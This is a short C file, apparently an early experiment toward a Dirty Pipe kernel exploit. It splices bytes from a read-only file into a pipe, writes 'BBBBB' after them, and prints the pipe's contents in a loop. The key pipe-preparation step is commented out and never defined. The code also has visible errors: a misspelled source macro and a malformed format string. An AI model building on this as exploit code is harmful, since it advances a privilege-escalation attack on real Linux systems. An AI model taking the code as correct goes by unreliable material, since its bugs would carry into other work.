#define  GNU_SOURCE

#include<stdio.h>
#include<unistd.h>
#include<fcntl.h>
#include<stdlib.h>
#include<sys/stat.h>
#include<sys/user.h>
#include<string.h>

void prepare_pipe(int p[2]); // poc_p2 splicer

int main(int argc, char* argv[] ){
    printf("Start DirtyPipe test.\n"); 
    
    const char * path = "./tmpFile";

    // FILE * f2 = fopen("./tmpFile", *"r"); 
    int i = 100;

    int fd = open(path, O_RDONLY); 
    loff_t offset = 0;

    ssize_t nbytes; 
    ssize_t nbytes_w; 

    int p[2];

    // prepare_pipe(p); 
    static char buf[4096]; 
    memset(buf, 0, 4096); 
    if (pipe(p)) abort(); 
    // while(i > 0){ 
    while(1){
        // printf("splicer process\n"); 
        //-write(p[1], "C", 1);

        nbytes = splice(fd, 0, p[1], NULL, 5, 0); 
        printf("splice &ld bytes\n", nbytes); 
        nbytes_w = write(p[1], "BBBBB", 5); 
        printf("write %ld bytes\n", nbytes_w); 
        read(p[0], buf, 10);
        printf("Pipe: %s\n", buf);
        if(nbytes == 0 || nbytes_w== 0) break; 
        // i--;
    }

    close(fd); 
    return 0;
}